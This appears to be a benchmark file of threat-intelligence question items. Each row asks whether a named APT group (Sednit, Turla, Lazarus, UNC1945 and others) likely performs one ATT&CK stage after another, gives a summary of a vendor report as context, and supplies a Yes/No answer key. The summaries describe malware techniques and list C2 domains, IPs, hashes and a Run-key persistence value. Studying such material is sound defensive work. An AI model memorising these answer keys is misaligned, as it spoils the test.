940,222,222-Execution-T1059-Command and Scripting Interpreter,"After distributing Zebrocy components through spearphishing emails to gain initial access, is it likely that the Sednit group’s operators will use a Stage-1 downloader to download and execute a new downloader before employing COM object hijacking for persistence by adding custom registry keys?","Initial Access: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, launched a spearphishing email campaign at the end of August 2018, distributing shortened URLs that delivered the first stage of Zebrocy components. The campaign relied on social engineering to lure victims into running the first part of the chain. The URL led to an IP-address-based URL where the archived payload was located, containing an executable file and a decoy PDF document. The executable, when run, would prompt for a password and then open the decoy PDF, while the downloader written in Delphi continued to run in the background.
Persistence: The operators used COM object hijacking for persistence, adding registry keys for a custom backdoor that was executed using the CMD_EXECUTE command. This backdoor was installed only for a few hours and was removed quickly after its operators completed their tasks.
Defense Evasion: The Sednit group's malware deleted files (binaries and files created) after usage and killed processes to disable security tools.
Credential Access: The operators uploaded and used dumpers on victims' machines to target browsers and versions of Microsoft Outlook from 1997 through 2016. They retrieved databases related to credentials from software such as Firefox, The Bat! email client, and Opera.
Discovery: The operators gathered information about the victim's computer and environment, including registry keys enumeration, listing running processes, and using system commands to gather information about the victim.
Collection: The malware scanned for files matching specific extensions on the local system, network shared drives, and removable media. It staged data by creating a file containing paths of all files to exfiltrate and had features for input capture and screen capture.
Command and Control: The downloaders and backdoors communicated with the C&C server using commonly used ports 80 or 443. Data sent were hex-encoded and encrypted with AES or a custom algorithm. A fallback C&C server was embedded in the configuration.
Exfiltration: Data were automatically prepared with all file paths to retrieve and sent to the C&C server. The data were hex-encoded and encrypted with a known algorithm or a custom one.",Yes
312,141,141-Initial Access-T1566-Phishing,"After the BitterAPT group developed BitterRAT malware, is it likely that they utilized compromised websites and phishing schemes to distribute their threats before setting up Command and Control servers such as blitzchatlog.ddns.net for victim communication and data exfiltration?","Command and Control: The BitterAPT group utilized several Command and Control (CnC) servers to communicate with compromised systems. New domains were discovered, including blitzchatlog.ddns.net, playupdateapp.serveblog.net, and techfront.com.cn, which were used to exfiltrate personal data. The domain blitzchatlog.ddns.net, hosted by Leaseweb in the US, served as a resource for some applications and contained various .php files for different data services. The CnCs tracked victims using phone IMEI and SIM numbers.
Others: The BitterAPT group infiltrated Google Play with applications such as AlarmClockSlide, which shared the same package name and certificate as known BitterRAT malware. Other applications by the same developer, CreativeFox, were found on Google Play without data-exfiltration capabilities but could potentially be weaponized through updates. The applications' privacy pages pointed to the domain thew64binautoclean[.]org, which was developed with significant effort. Indicators suggest that the applications were designed to target Pakistani victims. BitterRAT has evolved to include modules for spying and stealing personal information, with capabilities to record calls, access call history, SMS, location, accounts, installed applications, documents, WhatsApp messages, and BBM messages. The malware also collects network details, IMEI, phone numbers, roaming status, and voice mail numbers. Some BitterRAT samples retrieve the CnC from a Firebase database due to improper configuration, revealing the domain flashnewsservice.org. The BitterAPT group's telemetry indicates a focus on Asian countries, with most scans coming from China, Hong Kong, and Singapore.",No
20,101,101-Collection-T1123-Audio Capture,"After establishing persistence by creating tasks such as 'Microsoft_up' and placing malicious files in directories like 'appdata/ MicroDes/', is ""Machete"" likely to capture audio from the computer's microphone and copy files to a special USB device during the collection phase?","Initial Access: The malware known as ""Machete"" is distributed through social engineering tactics, including spear-phishing emails and a fake blog website. No evidence suggests the use of exploits targeting zero-day vulnerabilities. The attackers and victims are both Spanish-speaking. The malware is embedded in PowerPoint presentations disguised as Nullsoft Installer self-extracting archives with names such as 'Hermosa XXX.pps.rar', 'Suntzu.rar', 'El arte de la guerra.rar', and 'Hot brazilian XXX.rar'. These files, when opened, install the malware on the target system.
Persistence: On infected machines, ""Machete"" creates a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installs the malware in 'appdata/ MicroDes/'. It also creates a task named 'Microsoft_up'.
Others: The campaign, believed to have started in 2010 and renewed in 2012, may still be active. Victims are primarily located in Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, and include high-profile targets such as intelligence services, military, embassies, and government institutions. The malware uses Python embedded into Windows executables, which is unusual and suggests ease of coding rather than multi-platform support. Infrastructure for Mac OS X and Unix victims, as well as a mobile (Android) component, were also discovered. Indicators of Compromise include suspicious domains like 'java.serveblog.net', 'agaliarept.com', and others, as well as a known infection artifact 'hxxp://name.domain.org/nickname/set/Signed_Update.jar'. Malicious samples related to this attack are detected by Kaspersky Lab products as Trojan-Spy.Python.Ragua.",No
1580,302,302-Exfiltration-T1041-Exfiltration Over C2 Channel,"After utilizing the RPC protocol and Microsoft OneDrive as command and control channels, is it likely that PowerStallion will exfiltrate information by writing encrypted command results to a OneDrive subfolder using XOR key 0xAA?","Execution: ESET researchers have analyzed new tactics, techniques, and procedures (TTPs) attributed to the Turla group, which involve leveraging PowerShell to run malware directly in memory, thus bypassing detection mechanisms that activate when a malicious executable is dropped on disk. The Turla group, also known as Snake, has been active since at least 2008 and is known for its sophisticated malware and espionage operations. The PowerShell scripts used by Turla persist on the system by regularly loading embedded executables into memory only, without writing them to disk.
Persistence: Turla operators have employed two methods for persistence: using a Windows Management Instrumentation (WMI) event subscription and altering the PowerShell profile (profile.ps1 file). In the case of WMI, attackers create event filters and consumers to execute base64-encoded PowerShell commands that load a large script stored in the Windows registry. The PowerShell profile is modified to run a script when PowerShell starts, which includes commands to load and execute the malware.
Defense Evasion: Turla's PowerShell scripts are designed to evade detection by encrypting payloads and obfuscating scripts. They also include an AMSI bypass technique that patches the AmsiScanBuffer function in memory to prevent antimalware products from receiving and scanning the buffer. This technique was not newly discovered but reused from a presentation at Black Hat Asia 2018.
Discovery: Turla's RPC backdoor and PowerStallion backdoor are used to perform lateral movement and take control of machines within a local network. They implement basic features such as file upload, download, and command execution. The RPC backdoor also supports the addition of plugins, which can gather file and directory information and monitor USB drives. PowerStallion monitors antimalware logs and the Windows process list.
Collection: Turla's RPC backdoor plugins are capable of collecting recent files from the local file system and files from USB drives. PowerStallion, a lightweight PowerShell backdoor, uses Microsoft OneDrive as a command and control server and can execute additional PowerShell scripts, writing command results to another OneDrive subfolder.
Command and Control: The RPC backdoor uses the RPC protocol for command and control, while PowerStallion uses Microsoft OneDrive, accessed via SMB, as its command and control server.",Yes
1141,244,244-Initial Access-T1566-Phishing,"After exploiting the Follina vulnerability for initial access, is it likely that the GroundPeony threat group will execute malicious executables such as ""Install.exe"" renamed to ""mic.exe"" for DLL side-loading before establishing communication with the C&C server using encoded information within the ""mic.ver"" configuration file?","Execution: The GroundPeony campaign utilized a malicious executable named "".exe"" or ""Install.exe"" which was copied and renamed to ""mic.exe"" for DLL side-loading. The side-loaded DLL, ""version.dll"", functioned as a shellcode launcher for ""mic.doc"", which is a shellcode downloader known as micDown. The ""mic.ver"" file served as a config file for ""mic.doc"". The attack flow involved executing the renamed executable, loading and decrypting the associated files, and communicating with the C&C server.
Defense Evasion: The GroundPeony campaign exhibited defense evasion techniques through the use of DLL side-loading, specifically with the ""version.dll"" file. This file was used to decode and launch shellcode from ""mic.doc"". The decoding process was a two-step procedure involving custom XOR operations. Additionally, the ""mic.doc"" payload had its MZ header removed and was responsible for downloading encoded shellcode, which it would then decode using a similar custom XOR algorithm.
Command and Control: The GroundPeony campaign established command and control (C&C) communication through the use of a C&C server, identified by the domain ""app.onedrivo.com"" with the IP address 172.93.189.239. The ""mic.ver"" config file contained encoded information for connecting to the C&C server, including the IP address and port, which was decoded to facilitate communication.
Others: The GroundPeony threat group, also known as UNC3347, is a China-nexus threat group active since at least 2021, targeting government, research, educational institutes, and telecom sectors in Taiwan, Hong Kong, South Korea, Nepal, and India. The group has been linked to past campaigns exploiting the Follina vulnerability (CVE-2022-30190) and has used infrastructure associated with PublicDomainRegistry, AS63734 (365 Online technology joint stock company), AS55720 (Gigabit Hosting Sdn Bhd), and AS 30823 (combahton GmbH). Indicators of Compromise (IoCs) include various SHA256 hashes and IP addresses/domains such as 103.199.17.184, 160.20.145.111, and *.onedrivo.com.",Yes
720,191,191-Discovery-T1016-System Network Configuration Discovery,"After ensuring persistence by downloading the second-stage binary to the startup folder, is the Rising Sun implant likely to perform initial reconnaissance by fetching network adapter info and IP address information as part of discovery before communicating with control servers using HTTP POST requests?","Reconnaissance: The McAfee Advanced Threat Research team reported that Operation Sharpshooter masqueraded as legitimate industry job recruitment activity to gather information for potential exploitation. The campaign used similar techniques associated with other job recruitment campaigns. The malicious documents contained Korean-language metadata and English-language job description titles, indicating a focus on English-speaking targets or those with English-speaking regional offices. The majority of targets were defense and government-related organizations.
Initial Access: Operation Sharpshooter began on October 25 with a series of malicious documents authored by 'Richard' and distributed via an IP address in the United States and through Dropbox. These documents contained a malicious macro that injected the Sharpshooter downloader into the memory of Word, which then retrieved the second-stage implant Rising Sun from a control server.
Execution: The shellcode executed by the macro in winword.exe acted as a downloader for the Rising Sun implant. It resolved Libraries and APIs using LoadLibraryA() and GetProcAddress(), downloaded the second-stage payload and a decoy document to the startup folder and %LOCALAPPDATA% respectively, and executed both payloads using CreateProcessA() and ShellExecuteA().
Persistence: The Rising Sun implant ensured persistence on the system by downloading the second-stage binary to the startup folder during the download process, thereby removing the need for the implant to set up persistence for itself.
Command and Control: The Rising Sun implant communicated with control servers using HTTP POST requests, sending data in various formats encrypted with RC4 and obfuscated with Base64 encoding. The control servers identified were 34.214.99.20/view_style.php, 137.74.41.56/board.php, and kingkoil.com.sg/board.php.
Exfiltration: The Rising Sun implant encrypted data using the RC4 stream encryption algorithm and obfuscated it with Base64 encoding before exfiltrating it to the control server via HTTP POST requests.
Others: The McAfee Advanced Threat Research team discovered a new implant framework using code from the 2015 backdoor Duuzer, which was last seen targeting South Korea and Japan. The Rising Sun implant shares multiple similarities with Lazarus Group attacks but also raises the possibility of false flags. The campaign targeted nuclear, defense, energy, and financial companies globally, predominantly in the United States. The implant carries 14 backdoor capabilities, including executing commands, gathering drive and process information, reading and writing files, and modifying file attributes. Attribution to the Lazarus Group is suggested but not confirmed due to potential false flags.",Yes
1096,236,236-Discovery-T1135-Network Share Discovery,"After using system utilities such as ipconfig.exe and ping.exe for reconnaissance and gaining initial access through malicious documents with job offers, is it likely that the Lazarus Group used net user and SMBMap for network share discovery before leveraging compromised legitimate privileged accounts for lateral movement across the network?","Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.
Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.
Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.
Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.
Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes
1165,247,247-Defense Evasion-T1027-Obfuscated Files or Information,"After using a zero-day exploit embedded in a Word document to infect a target with Plexor malware, is it likely that Longhorn's tools will follow guidelines on tactics to avoid detection before performing system fingerprinting and discovery capabilities with their espionage-focused malware?","Initial Access: The Longhorn group has been active since at least 2011, utilizing back door Trojans and zero-day vulnerabilities to compromise targets. On one occasion, a computer in the United States was compromised but an uninstaller was launched within hours, indicating an unintentional infection. Longhorn's operations were first noticed by Symantec in 2014 when a zero-day exploit (CVE-2014-4148) embedded in a Word document was used to infect a target with Plexor malware.
Discovery: Longhorn's malware is built for espionage with detailed system fingerprinting, discovery, and exfiltration capabilities. It uses operational security measures to remain undetected.
Collection: Longhorn's malware has an extensive list of commands for remote control and can be customized with additional plugins and modules. It is designed for espionage-type operations with capabilities for detailed system fingerprinting, discovery, and exfiltration.
Command and Control: Longhorn configures a specific domain and IP address combination per target for C&C servers, using privacy services to hide their real identity. The IP addresses are typically owned by legitimate companies offering VPS or web hosting services. The malware communicates with C&C servers over HTTPS using a custom cryptographic protocol to protect communications from identification.
Exfiltration: Longhorn's malware communicates externally at select times, with upload limits on exfiltrated data, and randomization of communication intervals to avoid detection.
Others: Symantec has been protecting its customers from Longhorn's tools for the past three years and has continued to track the group. Longhorn has infiltrated governments and internationally operating organizations, as well as targets in various sectors. Symantec has found evidence of Longhorn activities against 40 targets in 16 countries. The group uses preconfigured malware with target-specific code words and distinct C&C domains and IP addresses. Longhorn operates with a high degree of operational security and appears to work a standard Monday to Friday working week, with indicators suggesting it is from an English-speaking, North American country.",Yes
2875,91,91-Command and Control-T1573-Encrypted Channel,"After using RC4 cipher with the key ""78563412"" for encrypting C2 address strings in the defense evasion phase, is the Bisonal malware likely to initiate communication with its C2 server using HTTP POST requests encrypted with the RC4 cipher in the command and control phase?","Initial Access: In early May, Unit 42 discovered an attack campaign against at least one defense company in Russia and one unidentified organization in South Korea delivering a variant of Bisonal malware. The adversary behind these attacks lured the targets into launching the Microsoft Windows executable malware by masquerading it as a PDF file (using a fake PDF icon) and reusing publicly available data for the decoy PDF file's contents. The spear-phishing email sent to the target organization was spoofed to look like it was sent from Rostec, a Russian state corporation. The email included project details aimed at improving the housing conditions of defense industry workers. The malicious executable attachment, once opened, dropped the main payload on the victim machine and displayed a decoy file to the victim, which matched an article published on Rostec's website on January 30, 2018.
Persistence: The dropper executable file in the Russian attack hides the encrypted Bisonal DLL file and non-malicious decoy file at the end of its body. Once executed, the dropper decrypts the data blob using the RC4 cipher with the key, ""34123412"", saves them in the path shown below and executes them. The dropper then creates the following registry entry to execute the Bisonal sample when the computer reboots: HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\""vert"" = ""rundll32.exe c:\windows\temp\pvcu.dll , Qszdez""
Defense Evasion: The Bisonal malware in the Russian attack used a different cipher for C2 communication than other publicly documented samples. It employs the RC4 cipher with the key ""78563412"" for encrypting C2 address strings. The malware variant communicates with one of the following hard-coded C2 addresses by using the HTTP POST method on TCP port 443: kted56erhg.dynssl[.]com and euiro8966.organiccrap[.]com, both resolving to the same IP address, 116.193.155[.]38. The initial HTTP POST request to the C2 server contains static strings ""ks8d"" and ""akspbu.txt"", and the IP address of the compromised machine. The User Agent request header is incomplete, which can be a good indicator in network logs for a possible Bisonal infection.",Yes
1438,284,284-Reconnaissance-T1589-Gather Victim Identity Information,"After ProjectM actors developed their custom toolset for campaigns and registered domains with or without WHOIS protection services, is it likely that they gathered victim identity information as part of their reconnaissance efforts before gaining initial access through spear-phishing emails and watering hole attacks?","Resource Development: The ProjectM actors have developed a significant toolset for their campaigns, including custom tools and off-the-shelf RATs. They have also utilized the Andromeda Trojan as an initial payload to download and execute other tools. Infrastructure used by ProjectM was often registered using WHOIS protection services, but two domains, 'winupdater[.]info' and 'ordering-checks[.]com,' were registered without protection, revealing the email address 'mshoaib.yaseen [at] gmail.com'. This email is linked to various social media accounts and suggests the individual's involvement in web design services and revenue generation through Google AdSense.
Initial Access: ProjectM actors gained initial access through spear-phishing emails and watering hole attacks, delivering payloads via malicious RTF and Excel files exploiting known vulnerabilities.
Execution: The ProjectM campaign executed malicious code through the use of Trojans like Crimson and Peppy, as well as RATs such as DarkComet and Bozok. Techniques included the exploitation of vulnerabilities and the use of malicious macros.
Defense Evasion: The ProjectM campaign utilized WHOIS protection services to conceal their infrastructure, but lapses in this practice revealed connections to an individual potentially involved in the campaign. The use of various Trojans and RATs also suggests techniques for defense evasion.
Command and Control: The ProjectM campaign's command and control infrastructure included domains registered with WHOIS protection, but two domains were linked to an individual's email address. These domains were used to host C2 servers for the Andromeda Trojan, which delivered further payloads.
Others: The individual linked to ProjectM's infrastructure appears to have skills in offensive cyber operations, as suggested by social media posts and blog content related to network scanning, Metasploit, and post-exploitation activities. The actor's name was found in the debug symbol path of Crimson tools, indicating possible involvement in malware development. The actor's anti-Indian sentiment, as expressed on social media, suggests a potential political motivation behind the attacks. Trend Micro discovered gigabytes of personal identifiable information (PII) on C2 servers related to ProjectM, indicating the collection of sensitive data from Indian Army personnel.",Yes
27,102,102-Privilege Escalation-T1068-Exploitation for Privilege Escalation,"After maintaining persistence on a Solaris 9 server by placing a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder, is UNC1945 likely to use the SLAPSTICK backdoor and Mimikatz to escalate privileges before installing backdoors like TINYSHELL on various endpoints?","Initial Access: In late 2018, UNC1945 exploited a vulnerability in an internet-exposed Solaris server's SSH service to install the SLAPSTICK backdoor, enabling credential capture for further compromise. In mid-2020, UNC1945 deployed the EVILSUN tool containing a zero-day exploit for CVE-2020-14871 on a Solaris 9 server, facilitating remote exploitation without authentication.
Execution: UNC1945 utilized custom virtual machines pre-configured with post-exploitation tools to execute commands, transfer files, and establish tunnel connections. They also employed a custom Linux backdoor named LEMONSTICK for command execution and file transfer.
Persistence: UNC1945 established persistence on a Solaris 9 server using the SLAPSTICK backdoor, which allowed user access with a secret hard-coded password. They also placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder to maintain access.
Defense Evasion: UNC1945 employed anti-forensics techniques using a custom ELF utility named LOGBLEACH to clean logs and built-in Linux commands to alter timestamps. They also executed a Linux ELF packer named STEELCORGI in memory to obfuscate activity.
Credential Access: UNC1945 collected credentials using the SLAPSTICK backdoor and Mimikatz, enabling lateral movement throughout networks and access to other network segments and third-party environments.
Discovery: UNC1945 maintained various tools for internal reconnaissance, including network scanners, exploits, and reconnaissance tools contained within their custom virtual machines. They also employed a SPARC executable identified as a reconnaissance tool, possibly referred to as Luckscan or BlueKeep.
Lateral Movement: UNC1945 moved laterally through networks using stolen credentials and tools such as ProxyChains to download PUPYRAT. They also used IMPACKET with SMBEXEC in a Windows environment for remote command execution and moved laterally via RDP to a Windows server.
Command and Control: UNC1945 used SSH Port Forwarding to maintain access to their external infrastructure and deployed a custom QEMU Virtual Machine on multiple hosts for direct access to the command and control server, obfuscating interaction with customer infrastructure.
Others: Mandiant did not observe evidence of data exfiltration and was unable to determine UNC1945's mission for most of the intrusions investigated. In at least one case, ROLLCOAST ransomware deployment was observed in the final phase of threat actor activity, but not attributed to UNC1945. It is likely that access to the victim environment was sold to another group.",No
150,118,118-Defense Evasion-T1112-Modify Registry,"After compromising the Microsoft Exchange Server through ProxyShell vulnerabilities for initial access, is Phosphorus likely to execute PowerShell code within a .NET application to avoid detection by security products before modifying the registry to aid in defense evasion?","Initial Access: The Cybereason Nocturnus Team reported that the Phosphorus group exploited the Microsoft Exchange Server vulnerabilities known as ProxyShell to gain initial access to target networks. This enabled the deployment of malware, including the PowerLess Backdoor.
Execution: The PowerLess Backdoor, developed by the Phosphorus group, executes PowerShell code within a .NET application context, avoiding the launch of 'powershell.exe' and thus evading detection by security products. The backdoor supports downloading additional payloads, such as a keylogger and an info stealer, and can execute arbitrary commands and kill processes.
Persistence: The PowerLess Backdoor creates persistence through scheduled tasks. The malware loader 'WindowsProcesses.exe' uses the Registry RunKeys or Startup Folder for boot or logon autostart execution. Additionally, the malware uses server software components like web shells for persistence.
Credential Access: The PowerLess Backdoor includes a keylogger module that captures user input, effectively accessing credentials. Additionally, OS credential dumping is performed using known LOLBIN techniques, such as leveraging 'Comsvcs.dll'.
Discovery: The Phosphorus group's PowerLess Backdoor has the capability to perform account discovery, specifically targeting local accounts on compromised systems.
Lateral Movement: After exploiting the Microsoft Exchange Server, the attackers used the PowerLess Backdoor to run reconnaissance commands and create persistence. They then dumped credentials and attempted to move laterally within the network.
Collection: The PowerLess Backdoor is capable of archiving collected data, including stealing browser data and keylogging information. The data is stored in paths such as 'C:\Windows\Temp\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK' and 'C:\Windows\Temp\cup.tmp'.
Command and Control: The PowerLess Backdoor communicates with a command and control (C2) server using web protocols and encrypted channels that employ symmetric cryptography. The backdoor also uses proxy techniques for C2 communication.
Others: The Phosphorus group, also known as APT35 or Charming Kitten, has been active in cyber espionage and offensive cyber attacks, operating in the interest of the Iranian regime. The group has targeted various sectors, including medical research, academia, human rights, and media, and has interfered with the US presidential elections. The Cybereason Nocturnus Team discovered a new set of tools developed by Phosphorus, including the PowerLess Backdoor, malware loaders, a browser info stealer, and a keylogger. The group has also been observed using open-source tools such as DiskCryptor, BitLocker, and Fast Reverse Proxy for RDP proxying. Connections were found between Phosphorus and the Memento Ransomware, suggesting a potential shift towards ransomware operations. The research emphasizes the importance of following the breadcrumbs, such as pivoting on known infrastructure or PDB paths, to uncover additional tools and connections to other operations.",Yes
2573,53,53-Initial Access-T1566-Phishing,"After using MS-DOS obfuscated code in a .lnk file to execute a PowerShell script for carving out a base64 encoded script and orchestrating further activities, is it likely that malware would have initially been sent to email accounts through suspicious emails appearing to originate from a Vietnam government domain before being delivered via a zip file attachment containing .lnk files simulating document icons?","Execution: The .lnk file's target property contained MS-DOS obfuscated code that, when executed, would carve out a base64 encoded PowerShell script named s.ps1 and save it in the %TEMP% directory. This PowerShell script was designed to execute another PowerShell script in memory, which would then run a WScript Shell. The WScript Shell created three files: a decoy DOC file, a legitimate tool for installing .NET assembled files to bypass SmartScreen and AppLocker protection, and a .NET DLL file containing the actual malicious payload.
Persistence: The PowerShell script checked for administrative privileges and copied the DLL file to WINDIR\debug\ or %TEMP% accordingly. It then created a scheduled task with SYSTEM privileges if the user was an administrator, or with lower privileges otherwise. The malware also checked for the presence of Kaspersky antivirus and adjusted its behavior accordingly, either running a VBS script or renaming it to TXT and executing it with wbscript /E:vbscript.
Defense Evasion: The malware employed a technique using InstallUtil.exe, a legitimate .NET tool, to avoid detection by Smartscreen and Applocker. The DLL was 'uninstalled' using InstallUtil.exe with the '/u' command, which paradoxically installed the malware. The .DAT file generated by the script was a DLL file compiled with .NET that contained the payload and was injected into memory.
Command and Control: The payload was identified as a Cobalt Strike beacon, evident from its communication pattern with the command and control server.
Others: The attack targeted the Vietnamese government using a combination of sophisticated techniques. The use of a .LNK file helped evade sandboxes, and the obfuscation techniques kept the malware under the radar. The execution technique allowed the malware to evade Endpoint Detection and Response (EDR) systems by loading through a legitimate binary and working in memory for deobfuscation and injection. The infrastructure used in this attack was not associated with any other known attacks. Indicators of Compromise (IOCs) include the IP address 144.202.54.86, hashes 0476ec8b4cb1b5dd368be52d9249f5b3cf6709b3141e9d02814c05f61cb90a91, 89fdef30c14db09e4e82c561db4a35cbc039b95bdfa6340546f7ee54b887f59b, 52dc9be06e921276c9df828b6be6da994df667e25af03bdddcc6cfec1470f1d7, and the mutex GLOBAL_VMSytnSCg.",Yes
1117,24,24-Defense Evasion-T1027-Obfuscated Files or Information,"After LYCEUM gained initial access through password spraying or brute-force attacks and delivering DanBot malware via spearphishing emails with malicious Excel attachments, is it likely that LYCEUM would deploy an obfuscated macro tool like DanDrop to drop the DanBot malware before utilizing it for execution of arbitrary commands via cmd.exe?","Initial Access: The LYCEUM threat group gained initial access to organizations by using account credentials obtained through password spraying or brute-force attacks. They then sent spearphishing emails with malicious Excel attachments to deliver the DanBot malware.
Execution: LYCEUM executed the DanBot malware, a first-stage remote access trojan (RAT) that uses DNS and HTTP-based communication mechanisms. The malware provides basic remote access capabilities, including the ability to execute arbitrary commands via cmd.exe and to upload and download files. Additionally, the group used a PowerShell-based keylogger (kl.ps1), a script to decrypt passwords from the RDCMan configuration file (Decrypt-RDCMan.ps1), and a script to gather account information from Active Directory (Get-LAPSP.ps1).
Credential Access: LYCEUM deployed tools such as Decrypt-RDCMan.ps1 to decrypt passwords stored in the RDCMan configuration file and Get-LAPSP.ps1 to gather account information from Active Directory, which could provide additional access within the environment.
Discovery: LYCEUM targeted HR and IT personnel with spearphishing emails to compromise accounts that could yield information and access for further spearphishing operations within the targeted environment and against associated organizations.
Command and Control: LYCEUM registered new domains for individual campaigns, which were typically used within a few weeks of registration. These domains, suspected to be part of LYCEUM's command and control infrastructure, often had a security or web technology theme.
Others: The LYCEUM threat group has been active since at least April 2018, targeting critical infrastructure organizations in the Middle East, particularly in the oil and gas sector. They have demonstrated capabilities similar to other threat groups operating in the region, such as COBALT GYPSY and COBALT TRINITY. Secureworks Counter Threat Unit researchers recommend implementing multi-factor authentication, increasing visibility via endpoint detection, response, and logging, conducting preparedness exercises, and reinforcing phishing awareness to mitigate the threat posed by LYCEUM.",Yes
2576,53,53-Defense Evasion-T1553-Subvert Trust Controls,"After creating a scheduled task with SYSTEM privileges or lower privileges based on user rights for persistence, is it likely that the malware will generate a DLL file from the .DAT file using InstallUtil.exe as part of its defense evasion strategy?","Initial Access: A malware was sent to email accounts belonging to a Vietnam government domain on March 13th, 2019. The email, written in Vietnamese, appeared to originate from an internal account (gov.vn) and was flagged as suspicious. The malware was delivered via a zip file attachment that contained a .lnk file simulating a document icon, a technique known to be used by attackers but not widely popular.
Execution: The .lnk file's target property contained MS-DOS obfuscated code that, when executed, would carve out a base64 encoded PowerShell script named s.ps1 and save it in the %TEMP% directory. This PowerShell script was designed to execute another PowerShell script in memory, which would then run a WScript Shell. The WScript Shell created three files: a decoy DOC file, a legitimate tool for installing .NET assembled files to bypass SmartScreen and AppLocker protection, and a .NET DLL file containing the actual malicious payload.
Persistence: The PowerShell script checked for administrative privileges and copied the DLL file to WINDIR\debug\ or %TEMP% accordingly. It then created a scheduled task with SYSTEM privileges if the user was an administrator, or with lower privileges otherwise. The malware also checked for the presence of Kaspersky antivirus and adjusted its behavior accordingly, either running a VBS script or renaming it to TXT and executing it with wbscript /E:vbscript.
Command and Control: The payload was identified as a Cobalt Strike beacon, evident from its communication pattern with the command and control server.
Others: The attack targeted the Vietnamese government using a combination of sophisticated techniques. The use of a .LNK file helped evade sandboxes, and the obfuscation techniques kept the malware under the radar. The execution technique allowed the malware to evade Endpoint Detection and Response (EDR) systems by loading through a legitimate binary and working in memory for deobfuscation and injection. The infrastructure used in this attack was not associated with any other known attacks. Indicators of Compromise (IOCs) include the IP address 144.202.54.86, hashes 0476ec8b4cb1b5dd368be52d9249f5b3cf6709b3141e9d02814c05f61cb90a91, 89fdef30c14db09e4e82c561db4a35cbc039b95bdfa6340546f7ee54b887f59b, 52dc9be06e921276c9df828b6be6da994df667e25af03bdddcc6cfec1470f1d7, and the mutex GLOBAL_VMSytnSCg.",Yes
1126,241,241-Initial Access-T1566-Phishing,Are Ukrainian and Polish state organizations and businesses likely to be targeted with BlackEnergy spear-phishing emails related to the current Ukrainian crisis before the malware executes techniques for bypassing UAC and defeating the signed driver requirement for Defense Evasion?,"Defense Evasion: BlackEnergy is a trojan which has undergone significant functional changes since it was first publicly analyzed by Arbor Networks in 2007. It has evolved from a relatively simple DDoS trojan into a sophisticated piece of modern malware with a modular architecture. The malware includes techniques for bypassing UAC, defeating the signed driver requirement in Windows, and a selection of BlackEnergy2 plug-ins used for parasitic file infections, network discovery, remote code execution, and data collection.
Others: The most recent campaigns leveraging BlackEnergy are dated August 2014. The malware has been used for sending spam, online bank fraud, and targeted attacks. BlackEnergy version 2, which featured rootkit techniques, was documented by SecureWorks in 2010. The targeted attacks recently discovered are proof that the trojan is still active. The technical analysis of the BlackEnergy family focuses on novel functionality and the differences introduced by new 'lite' variants. The many targets in the Ukraine and Poland have been infected through several known and unknown infection vectors.",Yes
1385,277,277-Discovery-T1120-Peripheral Device Discovery,"After conducting reconnaissance on medical infrastructure using tools like masscan and identifying Building Management systems with Niagara Fox protocol and unauthenticated printer web interfaces, is it likely that outdated medical devices supporting the MQTT protocol and discoverable online will be identified during the discovery phase?","Reconnaissance: The CTI report by Denis Makrushin and Yury Namestnikov, dated March 13, 2018, details the reconnaissance efforts of cybercriminals targeting medical networks. The authors describe the use of masscan to identify potential entry points into medical infrastructure by extracting IP ranges associated with medical-related keywords. They also mention the use of specialized search engines like Shodan and Censys to find publicly available resources of these organizations. The report highlights the discovery of non-trivial ports and services, such as Building Management systems using the Niagara Fox protocol and printers with web interfaces without authentication, which could be exploited for further reconnaissance.
Others: The report provides an overview of the threats affecting medical networks, with statistics showing that over 60% of medical organizations had malware on their servers or computers in 2017. It also discusses the targeting of pharmaceutical organizations by APT actors using malware like PlugX and Cobalt Strike to exfiltrate data, suggesting an interest in intellectual property or business plans. The authors recommend removing medical data nodes from public access, updating software, and avoiding connecting expensive equipment to the main LAN as measures to mitigate these threats.",Yes
